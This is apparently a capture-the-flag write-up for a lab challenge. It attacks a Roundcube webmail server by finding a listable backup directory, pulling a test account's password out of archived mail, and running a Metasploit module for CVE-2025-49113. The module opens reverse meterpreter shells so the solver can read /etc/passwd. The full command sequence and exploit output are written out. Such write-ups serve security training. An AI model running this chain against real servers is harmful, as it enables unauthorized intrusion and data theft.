# Temporary webmail (3 points)

Hi, emergency troubleshooter,

the e-mail administrator, Bob, was tasked with hastily setting up a new webmail
server for temporary access to old e-mails. Verify whether the server is
properly secured (you know how it usually goes with temporary services).

Stay grounded!

* Webmail runs on server `webmail.powergrid.tcc`.

## Hints

* IT department is known for using disposable test accounts `ADM40090`,
  `ADM40091`, `ADM40092` up to `ADM40099`.

## Solution

The provided server seems to be running Roundcube webmail. Since there do not
seem to be any other clues on the home/login page, let's try to use `dirb` to
scan what else is on the server.

```
$ dirb http://webmail.powergrid.tcc

-----------------
DIRB v2.22
By The Dark Raver
-----------------

URL_BASE: http://webmail.powergrid.tcc/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://webmail.powergrid.tcc/ ----
==> DIRECTORY: http://webmail.powergrid.tcc/backup/
+ http://webmail.powergrid.tcc/index.php (CODE:200|SIZE:5327)
==> DIRECTORY: http://webmail.powergrid.tcc/plugins/
==> DIRECTORY: http://webmail.powergrid.tcc/program/
+ http://webmail.powergrid.tcc/server-status (CODE:403|SIZE:286)
==> DIRECTORY: http://webmail.powergrid.tcc/skins/

---- Entering directory: http://webmail.powergrid.tcc/backup/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://webmail.powergrid.tcc/plugins/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://webmail.powergrid.tcc/program/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://webmail.powergrid.tcc/skins/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

-----------------
DOWNLOADED: 4612 - FOUND: 2
```

The `backup` directory looks interesting and is listable, so we can simply
open it and see that it contains `maildir-20150507.tgz` that we can download
without any issues. After extracting it, we can see that it contains a lot of
e-mails.

The content is massive and it indentionally contains a lot of false positives
so grepping for `password`, `flag`, etc. yields a lot of results (at least too
much to be able to processed visually), however, we can use the hint and scan
for occurrences of `ADM400` to see, whether some e-mail does not contain any
interesting information about these accounts.

```
$ tar -Oxzf maildir-20150507.tgz | grep -A1 "ADM400"
as the old one and is working fine down here. The USERID is ADM40092 and the
default password on it is "WELCOME6". Just let me know if you have any
--
as the old one and is working fine down here. The USERID is ADM40092 and the
default password on it is "WELCOME6". Just let me know if you have any
--
as the old one and is working fine down here. The USERID is ADM40092 and the
default password on it is "WELCOME6". Just let me know if you have any
```

This reveals the password for `ADM40092` which still works, however, even after
successfully logging in to Roundcube we don't see anything that would look like
a flag. However, in the `About` dialog we can see that the server is running
`Roundcube Webmail 1.6.10`.

This version contains remote code execution vulnerability (2025-49113) and
there is a [known exploit][roundcube-exploit] for it for authenticated users.

Since we're able to log in as `ADM400092`, we should be able to use
`metasploit` to execute any commands on the server.

```
$ msfconsole

msf > use exploit/multi/http/roundcube_auth_rce_cve_2025_49113

Matching Modules
================

   #  Name                                                  Disclosure Date  Rank       Check  Description
   -  ----                                                  ---------------  ----       -----  -----------
   0  exploit/multi/http/roundcube_auth_rce_cve_2025_49113  2025-06-02       excellent  Yes    Roundcube Post-Auth RCE via PHP Object Deserialization
   1    \_ target: Linux Dropper                            .                .          .      .
   2    \_ target: Linux Command                            .                .          .      .


Interact with a module by name or index. For example info 2, use 2 or use exploit/multi/http/roundcube_auth_rce_cve_2025_49113
After interacting with a module you can manually set a TARGET with set TARGET 'Linux Command'

[*] Using exploit/multi/http/roundcube_auth_rce_cve_2025_49113
[*] Using configured payload linux/x64/meterpreter/reverse_tcp
msf exploit(multi/http/roundcube_auth_rce_cve_2025_49113) > set RHOSTS webmail.powergrid.tcc
RHOSTS => webmail.powergrid.tcc
msf exploit(multi/http/roundcube_auth_rce_cve_2025_49113) > set USERNAME ADM40092
USERNAME => ADM40092
msf exploit(multi/http/roundcube_auth_rce_cve_2025_49113) > set PASSWORD WELCOME6
PASSWORD => WELCOME6
msf exploit(multi/http/roundcube_auth_rce_cve_2025_49113) > set LHOST 10.200.0.11
LHOST => 10.200.0.11
msf exploit(multi/http/roundcube_auth_rce_cve_2025_49113) > run
[*] Exploiting target 10.99.25.31
[*] Started reverse TCP handler on 10.200.0.11:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[+] Extracted version: 10610
[+] The target appears to be vulnerable.
[*] Fetching CSRF token...
[+] Extracted token: 1vijrwt4F6S2jfcX9IZshLEBHpjxVK6l
[*] Attempting login...
[+] Login successful.
[*] Preparing payload...
[+] Payload successfully generated and serialized.
[*] Uploading malicious payload...
[+] Exploit attempt complete. Check for session.
[*] Sending stage (3090404 bytes) to 10.99.25.31
[*] Meterpreter session 1 opened (10.200.0.11:4444 -> 10.99.25.31:49816)
[*] Session 1 created in the background.
[*] Exploiting target 2001:db8:7cc::25:31
[*] Started reverse TCP handler on 10.200.0.11:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[+] Extracted version: 10610
[+] The target appears to be vulnerable.
[*] Fetching CSRF token...
[+] Extracted token: 98REKnGZne4BaZFJZSHBwE0LXzUGbU3r
[*] Attempting login...
[+] Login successful.
[*] Preparing payload...
[+] Payload successfully generated and serialized.
[*] Uploading malicious payload...
[+] Exploit attempt complete. Check for session.
[*] Sending stage (3090404 bytes) to 10.99.25.31
[*] Meterpreter session 2 opened (10.200.0.11:4444 -> 10.99.25.31:49828)
[*] Session 2 created in the background.
msf exploit(multi/http/roundcube_auth_rce_cve_2025_49113) > sessions

Active sessions
===============

  Id  Name  Type                   Information             Connection
  --  ----  ----                   -----------             ----------
  1         meterpreter x64/linux  www-data @ 10.99.25.31  10.200.0.11:4444 -> 10.99.25.31:49816 (10.99.25.31)
  2         meterpreter x64/linux  www-data @ 10.99.25.31  10.200.0.11:4444 -> 10.99.25.31:49828 (2001:db8:7cc::25:31)
```

We gained two sessions (for both IPv4 and IPv6 address) so we can use any one
of them to explore the server. The base64-encoded flag is hidden in
`/etc/passwd`.

```
msf exploit(multi/http/roundcube_auth_rce_cve_2025_49113)> sessions -i 1
[*] Starting interaction with 1...
meterpreter > cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
_galera:x:100:65534::/nonexistent:/usr/sbin/nologin
mysql:x:101:101:MariaDB Server,,,:/nonexistent:/bin/false
dovecot:x:102:103:Dovecot mail server,,,:/usr/lib/dovecot:/usr/sbin/nologin
dovenull:x:103:104:Dovecot login user,,,:/nonexistent:/usr/sbin/nologin
postfix:x:104:105::/var/spool/postfix:/usr/sbin/nologin
flag:x:65535:65535:RkxBR3tXbThuLXQ1cWUteEhueS1nNEdPfQ==:/nonexistent:/usr/sbin/nologin
adm40092:x:1001:1001::/home/adm40092:/bin/sh
```

The final step is just base64 decryption.

```
$ echo RkxBR3tXbThuLXQ1cWUteEhueS1nNEdPfQ== | base64 -d
FLAG{Wm8n-t5qe-xHny-g4GO}
```

[roundcube-exploit]: https://www.exploit-db.com/exploits/52324
